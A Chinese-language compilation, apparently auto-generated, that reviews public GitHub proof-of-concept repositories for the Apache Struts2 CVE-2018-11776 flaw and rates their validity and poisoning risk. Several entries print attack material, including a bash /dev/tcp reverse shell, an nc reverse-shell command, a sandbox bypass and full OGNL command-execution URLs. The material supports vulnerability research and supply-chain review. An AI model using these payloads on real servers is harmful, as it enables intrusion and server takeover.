**投毒风险：** Dockerfile 的主要目的是构建一个包含漏洞的 Struts 2 应用程序，用于演示和测试 CVE-2018-11776 漏洞。它修改了 struts.xml 文件，添加了一个触发漏洞的 action。但除此之外，并没有明显的恶意代码或后门。README.md 只是提供了关于该镜像的信息，包括来源和作者。投毒风险较低，可能来自于作者的疏忽或者未来供应链攻击,例如依赖组件投毒。这里认为存在10%的风险，因为虽然表面上没有发现，但不排除存在一些隐蔽的或未来的风险。例如,如果Dockerfile的tomcat版本存在高危漏洞也会存在被利用的可能性.

**利用方式：** 漏洞的利用方式是通过构造恶意的 URL，该 URL 包含了 OGNL 表达式注入。攻击者可以通过访问这个特制的 URL，在服务器上执行任意代码。具体而言，需要满足以下条件：

1.  Struts 2 版本在 2.3.0 到 2.3.34 或 2.5.0 到 2.5.16 之间。
2.  `alwaysSelectFullNamespace` 设置为 true。
3.  应用配置中，存在没有 namespace 或者使用了 wildcard namespace 的 package。

满足这些条件后，攻击者可以通过访问类似 `http://example.com/${OGNL_EXPRESSION}` 的 URL 来执行任意命令。

**项目地址:** [cved-sources/cve-2018-11776](https://github.com/cved-sources/cve-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #8

**来源**: [CVE-2018-11776-freshdemo_ApacheStruts-CVE-2018-11776.md](../2018/CVE-2018-11776-freshdemo_ApacheStruts-CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts2-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，且存在特定namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776是Apache Struts2框架中的一个远程代码执行漏洞。当`alwaysSelectFullNamespace`设置为true，并且使用了不带namespace的结果，同时其上层包没有或使用了通配符namespace，或使用了没有value和action属性的url标签，且其上层包没有或使用了通配符namespace时，攻击者可以通过构造恶意的OGNL表达式，并将其作为URL的一部分发送给服务器，即可在服务器上执行任意代码。

**有效性：**
提供的POC代码`exploit.py`基于Rapid7的metasploit-framework，利用了OGNL表达式注入漏洞。该POC通过修改OgnlUtil的excludedPackageNames和excludedClasses来绕过沙箱限制，从而执行任意命令。Dockerfile配置了易受攻击的Struts2环境，因此POC代码有效。

**投毒风险：**
经过对Dockerfile，README.md和`exploit.py`文件的分析，没有发现任何恶意代码或后门。`exploit.py`只是利用漏洞执行命令，没有植入持久后门或其他恶意行为。Dockerfile构建的镜像只是一个易受攻击的环境，没有额外的恶意修改。README.md仅包含如何构建和运行POC的说明。因此，投毒风险评估为0%。

**利用方式：**
1.  目标系统需要运行受影响版本的Apache Struts2，即2.3到2.3.34以及2.5到2.5.16。
2.  `alwaysSelectFullNamespace`参数必须设置为true。
3.  存在特定的namespace配置漏洞触发点 (如描述中所述)。
4.  攻击者构造包含恶意OGNL表达式的URL，该表达式利用了Struts2的OGNL注入漏洞。
5.  当目标系统处理包含恶意OGNL表达式的URL时，该表达式会被执行，从而允许攻击者在服务器上执行任意代码。

**项目地址:** [freshdemo/ApacheStruts-CVE-2018-11776](https://github.com/freshdemo/ApacheStruts-CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #9

**来源**: [CVE-2018-11776-hook-s3c_CVE-2018-11776-Python-PoC.md](../2018/CVE-2018-11776-hook-s3c_CVE-2018-11776-Python-PoC.md)

## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 设置为 true，且存在特定的命名空间配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-11776 是一个存在于 Apache Struts 2 中的远程代码执行漏洞。该漏洞的产生是由于 Struts 对命名空间处理不当，允许攻击者通过构造恶意的 URL 发起 OGNL 表达式注入，从而执行任意代码。

**有效性：**
根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，可以确认此漏洞是有效的。漏洞库信息将其描述为“possible Remote Code Execution”，搜索引擎结果中包含了大量的关于此漏洞的分析和利用的文章，漏洞利用代码提供了一个可行的 PoC。

**投毒风险：**
分析 PoC 代码内容：
* `Dockerfile`: 用于构建存在漏洞的 Struts2 环境，模拟漏洞存在场景,没有恶意代码。
* `README.md`: 提供了漏洞利用的详细步骤，包括环境搭建、配置修改、漏洞验证和命令执行/反弹 shell。其中涉及到命令执行和反弹shell的脚本，需要用户手动执行，但代码本身没有明显的恶意行为。
虽然提供的利用代码没有直接的恶意行为，但是仍然存在一定的投毒风险。例如，攻击者可以修改 exploit 脚本，在执行命令之前添加一些恶意的操作，例如植入后门程序或窃取敏感信息。由于用户需要手动执行这些脚本，因此存在一定的风险。考虑到 Dockerfile 和 exploit 脚本的透明性，以及需要用户手动修改配置和执行脚本，投毒的可能性较低，初步估计为 5%。

**利用方式：**
该漏洞的利用方式主要包括以下步骤：

1.  **环境准备：** 搭建存在漏洞的 Apache Struts 2 环境。可以使用提供的 Dockerfile 构建。
2.  **配置修改：** 修改 Struts 2 的配置文件 `struts.xml`，将 `struts.mapper.alwaysSelectFullNamespace` 设置为 `true`，并添加特定的 action 配置。
3.  **漏洞验证：** 使用提供的测试脚本验证目标是否易受攻击。该脚本会发送一个包含 OGNL 表达式的 URL，如果服务器返回预期的结果，则表明目标存在漏洞。
4.  **命令执行/反弹Shell：** 使用提供的命令执行脚本，构造包含 OGNL 表达式的 URL，执行任意命令。也可以通过反弹 shell 获取服务器的控制权。可以使用`/bin/bash -i >& /dev/tcp/172.17.0.1/31337 0>&1` 来执行反弹shell

**项目地址:** [hook-s3c/CVE-2018-11776-Python-PoC](https://github.com/hook-s3c/CVE-2018-11776-Python-PoC)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #10

**来源**: [CVE-2018-11776-jiguangsdf_CVE-2018-11776.md](../2018/CVE-2018-11776-jiguangsdf_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776 (S2-057) 是一个 Apache Struts 2 的远程代码执行漏洞。该漏洞是由于 Struts 在 XML 配置中，当 namespace 值未设置，且 Action Configuration 中未设置或用通配符 namespace 时，可能导致远程代码执行。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个真实存在且高危的远程代码执行漏洞。提供的 POC 代码 `s2-057.py` 旨在验证漏洞是否存在。POC通过构造特殊的 URL，利用 OGNL 表达式注入，判断服务器是否返回预期的状态码和内容来判断漏洞是否存在。从代码逻辑来看，POC的有效性较高。

**投毒风险：**
分析提供的 POC 代码 `s2-057.py`，未发现明显的投毒代码。该脚本主要功能是发送 HTTP 请求，验证目标 URL 是否存在 CVE-2018-11776 漏洞。脚本中没有发现任何试图在目标服务器上执行恶意操作的代码，例如上传后门、篡改文件等。脚本只是通过判断HTTP响应状态码和Header头中的Location或者Response的内容，来判断是否存在漏洞。

**利用方式：**
1.  **条件：** 需要目标 Struts 应用满足以下条件：
    *   Struts 版本在 2.3.x (2.3 to 2.3.34) 或 2.5.x (2.5 to 2.5.16) 范围内。
    *   `alwaysSelectFullNamespace` 设置为 `true`（通常由用户或插件如 Convention Plugin 设置）。
    *   结果 (results) 在没有 namespace 的情况下使用，并且其上层 package 没有或使用了通配符 namespace。
    *   或者，使用 `url` 标签，但 `value` 和 `action` 未设置，并且其上层 package 没有或使用了通配符 namespace。
2.  **Payload 构造：** 攻击者构造包含恶意 OGNL 表达式的 URL。该表达式会被 Struts 解析和执行，从而导致远程代码执行。
3.  **触发漏洞：** 攻击者发送构造好的 URL 到目标 Struts 应用。Struts 处理请求时，会解析并执行 OGNL 表达式，导致远程代码执行。
4.  **代码执行：** 根据 POC 的验证方法，可以通过判断特定的HTTP响应状态码和Header头中的Location或者Response的内容，来判断是否存在漏洞，或者直接执行系统命令来获取执行结果。

综上所述，该漏洞利用方式较为直接，但需要满足特定的配置条件。提供的 POC 代码可以有效验证漏洞的存在，但本身没有投毒风险。

**项目地址:** [jiguangsdf/CVE-2018-11776](https://github.com/jiguangsdf/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #11

**来源**: [CVE-2018-11776-knqyf263_CVE-2018-11776.md](../2018/CVE-2018-11776-knqyf263_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34 和 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定配置的package和result/url标签

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2中的一个远程代码执行漏洞。根据漏洞描述和搜索结果，当`alwaysSelectFullNamespace`设置为true，并且使用了不带namespace的result，同时其上层package也没有namespace或者使用了通配符namespace时，攻击者可以通过构造恶意的OGNL表达式来实现远程代码执行。提供的PoC代码通过发送包含恶意OGNL表达式的HTTP请求，利用Struts的OGNL表达式解析引擎执行任意命令。Dockerfile 构建了一个包含存在漏洞的 Struts 2.3.12 版本的 Tomcat 环境，为漏洞验证提供便利。

**有效性评估：**

根据漏洞库信息、搜索结果以及PoC代码分析，该漏洞的PoC代码是有效的。搜索结果中提及了多个关于CVE-2018-11776的分析报告和利用案例，表明该漏洞在实际环境中被成功利用过。

**投毒风险评估：**

PoC代码本身主要包含Dockerfile、LICENSE、README.md和exploit.py四个文件。`exploit.py`文件是漏洞利用脚本，功能明确，用于构造和发送恶意请求。Dockerfile用于构建存在漏洞的Struts2环境，简化了漏洞复现过程。LICENSE和README.md文件为常规说明文件。经过对PoC代码的分析，没有发现明显的恶意代码或后门，但仍存在一定的投毒风险：

1.  **依赖风险：** Dockerfile中使用了`apk add`命令安装了`vim`和`zip`，这些工具本身是安全的，但如果软件源被篡改，可能会引入恶意软件包。这部分的风险较低，约为5%。
2.  **命令注入风险：** 虽然`exploit.py`中的命令执行是通过用户提供的参数，但如果用户下载的exploit.py被篡改，将允许攻击者执行任意命令，则脚本可以被修改为包含恶意payload。但是，这是对所有脚本的通用风险。约为5%
3.  **供应链风险：** Struts 2 框架本身可能存在其他未知的安全问题，攻击者可能通过组合多个漏洞来实现更复杂的攻击。但是此风险已超出当前评估范畴。

总体而言，该仓库的投毒风险较低，约为10%。主要的风险在于用户下载的PoC代码可能被篡改，或者依赖的软件源被污染。建议用户在下载和使用PoC代码时，务必从可信来源获取，并进行安全审计。

**利用方式：**

1.  目标系统需要运行存在漏洞的Apache Struts版本（2.3 to 2.3.34 或 2.5 to 2.5.16），并且`alwaysSelectFullNamespace`配置为`true`。
2.  漏洞存在于当结果 (result) 在没有命名空间的情况下使用时，并且其上层包没有或具有通配符命名空间。或者当 url 标签没有 value 属性和 action 属性设置时，并且其上层包没有或具有通配符命名空间。
3.  攻击者构造包含恶意OGNL表达式的HTTP请求，例如在URL中嵌入OGNL表达式。
4.  Struts框架在处理请求时，由于OGNL表达式未经过充分的验证，恶意代码得以执行。
5.  攻击者可以利用此漏洞执行任意系统命令，实现远程代码执行，从而控制目标服务器。

**项目地址:** [knqyf263/CVE-2018-11776](https://github.com/knqyf263/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #12

**来源**: [CVE-2018-11776-m4sk0ff_CVE-2018-11776.md](../2018/CVE-2018-11776-m4sk0ff_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可以远程执行任意代码，完全控制服务器

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的package和namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。根据漏洞库信息和搜索结果，此漏洞的利用依赖于 `alwaysSelectFullNamespace` 设置为 true，以及特定的package和namespace配置。攻击者可以构造恶意的OGNL表达式，通过 URL 传入，导致服务器执行任意代码。

提供的漏洞利用代码包含 `bashexploit.py` 和 `bashexploit.sh` 两个脚本，它们都尝试利用 OGNL 表达式注入执行命令。这些脚本首先尝试绕过安全限制，然后执行反弹 shell 命令，将服务器的 shell 连接到攻击者的机器。

**有效性：**
提供的POC代码有效。漏洞利用代码通过OGNL表达式注入，分两步进行攻击：
1.  移除Struts的安全限制（`setExcludedClasses('')`和`setExcludedPackageNames('')`）。
2.  执行反弹shell命令（`nc 10.10.0.90 4747 -e /bin/bash`），允许攻击者远程访问服务器。

**投毒风险：**
此仓库中没有发现明显的投毒代码。代码的功能都是围绕利用CVE-2018-11776漏洞执行远程代码，没有发现作者添加的恶意功能。所以投毒风险评估为 **0%**。

**利用方式：**
1.  **目标确认：**  确认目标 Apache Struts 版本在受影响范围内 (2.3 to 2.3.34, 2.5 to 2.5.16)，并配置了 `alwaysSelectFullNamespace=true`。
2.  **OGNL 表达式注入：** 通过构造包含恶意 OGNL 表达式的 URL 来触发漏洞。恶意 OGNL 表达式可以执行任意代码。
3.  **绕过安全限制 (可选)：**  如果 Struts 启用了安全限制，可以先使用 OGNL 表达式移除这些限制，例如设置 `excludedClasses` 和 `excludedPackageNames` 为空。
4.  **执行恶意代码：**  使用 OGNL 表达式执行任意命令。常见的利用方式是执行反弹 shell 命令，从而获得对服务器的远程访问权限。
5.  **监听端口：**  攻击者需要在攻击机器上监听相应的端口（例如 `nc -lvp 4747`），以便接收反弹 shell 连接。

**项目地址:** [m4sk0ff/CVE-2018-11776](https://github.com/m4sk0ff/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #13

**来源**: [CVE-2018-11776-mazen160_struts-pwn_CVE-2018-11776.md](../2018/CVE-2018-11776-mazen160_struts-pwn_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts2 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，并且存在特定的命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是 Apache Struts2 的一个远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 true 时，Struts2 可能会由于对命名空间验证不足而导致 OGNL 表达式注入。攻击者可以通过构造恶意的 URL 来执行任意代码。漏洞利用代码（struts-pwn.py）可以通过发送包含恶意 OGNL 表达式的 HTTP 请求来触发漏洞。搜索结果显示该漏洞被广泛利用，并且存在多个公开的 PoC。POC代码中的投毒风险较低，主要集中在对命令执行结果的处理可能存在潜在风险，例如，如果命令执行结果包含恶意字符，可能会导致后续处理出现问题。这个风险大概在10%左右。

**利用方式：**

1.  目标系统必须运行存在漏洞的 Apache Struts2 版本（2.3 to 2.3.34, 2.5 to 2.5.16）。
2.  `alwaysSelectFullNamespace` 必须设置为 true。
3.  存在特定命名空间配置，例如结果没有命名空间，且上层包没有或使用通配符命名空间。
4.  攻击者构造包含恶意 OGNL 表达式的 URL，例如：`http://example.com/?redirect:${(#context.getClass().forName('java.lang.Runtime').getRuntime().exec('id')).getInputStream().readAllBytes()}`。
5.  目标系统解析该 URL，执行 OGNL 表达式，从而执行攻击者指定的命令。

**项目地址:** [mazen160/struts-pwn_CVE-2018-11776](https://github.com/mazen160/struts-pwn_CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #14

**来源**: [CVE-2018-11776-sonpt-afk_CVE-2018-11776-FIS.md](../2018/CVE-2018-11776-sonpt-afk_CVE-2018-11776-FIS.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是 Apache Struts 2 的一个远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 `true`，并且存在特定的命名空间配置时，攻击者可以通过构造恶意的 OGNL 表达式来实现远程代码执行。

**有效性:**

根据漏洞描述和搜索结果，此漏洞的POC代码是有效的。存在多个公开的POC和利用脚本，证明了该漏洞的可利用性。提供的Python POC 代码通过构造包含恶意 OGNL 表达式的 Content-Type 请求头，绕过 Struts 的安全机制，从而执行任意命令。

**投毒风险:**

分析提供的POC代码，主要关注以下几个方面：
*   **代码逻辑:** 代码逻辑相对清晰，主要是构造 OGNL 表达式并发送 HTTP 请求执行命令。
*   **外部依赖:** 代码使用了 `http.client`, `urllib.request`, `ssl`, `subprocess`, `sys` 这些标准库，没有引入额外的第三方库，降低了引入恶意代码的可能性。
*   **命令执行:** 代码通过 `subprocess` 模块执行命令，虽然这本身是漏洞利用的一部分，但也需要注意是否存在精心构造的命令，例如下载并执行恶意脚本。
*   **README.md**: README 描述了漏洞和影响，没有发现恶意链接或者描述。

综合分析，该POC代码主要实现了漏洞利用，没有发现明显的投毒代码。`subprocess` 执行的命令由用户指定，不在POC代码本身中定义。考虑到代码由用户自定义命令执行，以及需要目标满足一定环境条件，投毒的概率较低，大约为10%。

**利用方式:**

1.  **漏洞触发:** 漏洞触发的关键在于 `alwaysSelectFullNamespace` 设置为 `true`，同时应用存在特定的命名空间配置（例如，没有明确的命名空间或使用通配符命名空间）。
2.  **OGNL 表达式注入:** 攻击者构造包含恶意 OGNL 表达式的 URL 或请求参数。该表达式可以执行任意 Java 代码。
3.  **远程代码执行:** Struts 框架解析 OGNL 表达式，导致恶意代码执行，从而允许攻击者在服务器上执行任意命令。
4.  **利用POC代码:** 提供的POC代码通过修改请求头的Content-Type，注入OGNL表达式，利用了该漏洞，实现了在目标服务器上执行任意命令。

**项目地址:** [sonpt-afk/CVE-2018-11776-FIS](https://github.com/sonpt-afk/CVE-2018-11776-FIS)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #15

**来源**: [CVE-2018-11776-tuxotron_cve-2018-11776-docker.md](../2018/CVE-2018-11776-tuxotron_cve-2018-11776-docker.md)

## CVE-2018-11776-Apache Struts2-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，且结果未使用命名空间，或者url标签缺少value和action，且上层包无命名空间或通配符命名空间

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 漏洞是 Apache Struts2 框架中的一个远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 true，并且存在特定的命名空间配置时，攻击者可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息表明这是一个已公开的远程代码执行漏洞，并且有多个Exploit-DB链接。搜索引擎结果也显示了大量关于此漏洞的分析和利用文章。提供的Dockerfile、README.md和Go语言编写的exploit代码，都表明该漏洞存在可利用性。

**投毒风险：**
代码中存在投毒的潜在风险，但风险较低。主要风险存在于 `exploit-cve-2018-11776.go` 中，虽然代码的主要功能是利用漏洞执行命令，但如果作者恶意修改了 payload 构造方式或在命令执行后添加额外的操作，可能会引入投毒代码。例如，在执行命令后，将服务器上的敏感信息发送到攻击者控制的服务器。此外，`Dockerfile` 中虽然只是简单地部署了存在漏洞的应用，但也可能包含恶意修改，比如加入后门程序，尽管可能性较低。总体估计投毒风险为10%。

**利用方式：**
1.  **漏洞成因：** 漏洞由于 Struts2 框架对命名空间处理不当，导致 OGNL 表达式注入。
2.  **利用条件：** 需要满足 `alwaysSelectFullNamespace` 为 true 的条件，并且存在特定的命名空间配置，例如结果未使用命名空间，或者url标签缺少value和action，且上层包无命名空间或通配符命名空间。
3.  **攻击方法：** 攻击者通过构造包含恶意 OGNL 表达式的 URL，利用框架的漏洞执行任意命令。
4.  **POC 利用：** 提供的 exploit-cve-2018-11776.go  程序，首先构造一个包含 OGNL 表达式的 payload，该 payload 能够执行指定的命令。然后对 payload 进行 URL 编码，并将其拼接到目标 URL 后面。最后，通过发送 HTTP GET 请求到目标 URL，触发漏洞，执行 payload 中的命令，并将命令执行结果返回。
例如：`http://localhost:8080/${(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/help.action`

**项目地址:** [tuxotron/cve-2018-11776-docker](https://github.com/tuxotron/cve-2018-11776-docker)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #16

**来源**: [CVE-2018-11776-xfox64x_CVE-2018-11776.md](../2018/CVE-2018-11776-xfox64x_CVE-2018-11776.md)

## CVE-2018-11776 - Apache Struts Remote Code Execution

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3.x (2.3 to 2.3.34), 2.5.x (2.5 to 2.5.16)

**利用条件:** alwaysSelectFullNamespace 为 true，且存在无 namespace 或 wildcard namespace 的配置不当。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞，当 `alwaysSelectFullNamespace` 设置为 true 时，且存在 namespace 配置不当，攻击者可以通过构造恶意的 OGNL 表达式到 URL 中来执行任意代码。

**有效性评估：**

提供的 PoC 代码详细描述了漏洞的利用步骤，包括环境搭建、配置修改、OGNL 表达式构造和 URL 编码等。该 PoC 代码直接可用，因此判断为有效。

**投毒风险评估：**

PoC 代码主要用于验证漏洞的存在，以及攻击方式。代码本身展示了如何部署一个存在漏洞的环境，以及如何构造和发送恶意请求。虽然代码包含下载和部署 struts2-showcase 的步骤,但这仅用于搭建漏洞环境，并非恶意代码。其中执行 `gnome-calculator` 命令只是为了验证 RCE 是否成功。代码目的是为了验证漏洞，并未发现隐藏的、与漏洞利用无关的恶意行为。

综合判断，投毒的可能性较低，大约为 1%。

**利用方式分析：**

1.  **前提条件：** Apache Struts 版本在 2.3.x (2.3 to 2.3.34) 或 2.5.x (2.5 to 2.5.16) 范围内，`alwaysSelectFullNamespace` 设置为 true。
2.  **漏洞点：**  Struts 框架在处理 namespace 时，如果配置不当，允许攻击者注入 OGNL 表达式。
3.  **攻击方法：** 攻击者构造包含恶意 OGNL 表达式的 URL，利用 Struts 的重定向机制或其他方式触发 OGNL 表达式的执行。
4.  **利用步骤：**
    *   查找存在漏洞的 Struts 应用。
    *   构造恶意 OGNL 表达式，例如执行系统命令。
    *   将 OGNL 表达式进行 URL 编码。
    *   将编码后的 OGNL 表达式插入到 URL 中，发送请求。
    *   如果漏洞存在，服务器将执行 OGNL 表达式，从而实现远程代码执行。

**参考搜索结果：**

搜索结果中的多个链接都确认了 CVE-2018-11776 的存在和高危性，并指出该漏洞已被广泛利用。例如，[webpage 6] 提到该漏洞已被用于 Monero 挖矿活动，[webpage 7] 强调该漏洞可以被未授权用户利用。

总之，CVE-2018-11776 是一个严重的漏洞，需要及时修复。提供的 PoC 代码可用于验证漏洞是否存在，但在实际利用时应注意安全风险。

**项目地址:** [xfox64x/CVE-2018-11776](https://github.com/xfox64x/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---



---

## POC #6

**来源**: [CVE-2018-11776-brianwrf_S2-057-CVE-2018-11776.md](../2018/CVE-2018-11776-brianwrf_S2-057-CVE-2018-11776.md)

## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的namespace配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-11776 是 Apache Struts 2 的一个远程代码执行漏洞，存在于 2.3.x 版本到 2.3.34 和 2.5.x 版本到 2.5.16 中。

**有效性：**
提供的POC代码（exploit.py）是有效的。它通过构造恶意的OGNL表达式注入到URL中，利用Struts框架的漏洞执行任意系统命令。

**投毒风险：**
代码总体上是直接明了的漏洞利用程序，主要功能是通过构造包含恶意OGNL表达式的URL来利用漏洞。投毒的可能性较低，主要风险在于使用者使用该脚本攻击未经授权的系统。脚本本身包含少量payload，但大部分是用于执行命令和回显结果，没有发现明显的恶意代码或后门。但是要提醒使用者对从任何来源下载的代码都要谨慎审查。故投毒风险为5%。

**利用方式：**
1.  **漏洞触发条件:** 需要 `alwaysSelectFullNamespace` 为 true，或者使用 Convention Plugin 等插件导致该配置生效。
2.  **构造恶意URL:**  攻击者需要构造包含恶意 OGNL 表达式的 URL。OGNL 表达式允许攻击者执行任意代码。
3.  **命令执行:**  恶意 OGNL 表达式利用 `java.lang.Runtime.getRuntime().exec()` 执行操作系统命令。
4.  **结果回显:**  命令执行的结果通过 `HttpServletResponse` 的 `Writer` 对象回显到响应中。

**总结:**
CVE-2018-11776 是一个严重的远程代码执行漏洞。攻击者可以通过构造恶意的URL，在目标服务器上执行任意命令，导致服务器被完全控制。

**参考资料:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2018-11776](https://nvd.nist.gov/vuln/detail/cve-2018-11776)
*   Qualys Blog: [https://blog.qualys.com/vulnerabilities-threat-research/2018/08/23/detecting-apache-struts-2-namespace-rce-cve-2018-11776](https://blog.qualys.com/vulnerabilities-threat-research/2018/08/23/detecting-apache-struts-2-namespace-rce-cve-2018-11776)
*   Keysight Blog: [https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776](https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776)

**项目地址:** [brianwrf/S2-057-CVE-2018-11776](https://github.com/brianwrf/S2-057-CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #7

**来源**: [CVE-2018-11776-cucadili_CVE-2018-11776.md](../2018/CVE-2018-11776-cucadili_CVE-2018-11776.md)

## CVE-2018-11776 Apache Struts2 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.3 to 2.3.34 and 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 漏洞存在于 Apache Struts 2 框架中，允许攻击者通过构造特制的 URL 来执行任意代码。漏洞的触发条件是 `alwaysSelectFullNamespace` 参数为 true，并且应用程序的命名空间配置存在缺陷，例如缺少命名空间或者使用通配符命名空间。根据漏洞库信息和搜索结果，此漏洞影响 Struts 2.3.x 到 2.3.34 以及 2.5.x 到 2.5.16 版本。

**有效性：**
提供的POC代码包含Suricata规则和内核模块，用于检测和阻止利用此漏洞的攻击。Python PoC的github链接也被给出，证明此漏洞存在可利用性。根据搜索结果，此漏洞已被广泛利用，因此提供的PoC代码是有效的。

**投毒风险：**
提供的代码仓库中存在一定投毒风险，风险预估为10%。
*   `module_kernel.ko`：这是一个内核模块，如果编译和加载过程被篡改，可能引入恶意代码。虽然提供的代码看起来是无害的，但不能完全排除编译过程被污染的可能性。
*   `test.rules`：Suricata规则本身是用于检测恶意流量的，但如果规则被设计为故意放过某些恶意流量，则可以达到投毒的效果。当前规则只是简单的检测是否存在`allowStaticMethodAccess`，可以绕过。
*   README.md中提供的github链接可能指向包含恶意payload的PoC，虽然目前无法确定，但也存在潜在风险。

**利用方式：**
1.  **确定目标环境：** 目标应用程序必须使用受影响的 Apache Struts 2 版本（2.3.x 到 2.3.34 以及 2.5.x 到 2.5.16），且 `alwaysSelectFullNamespace` 配置为 true。
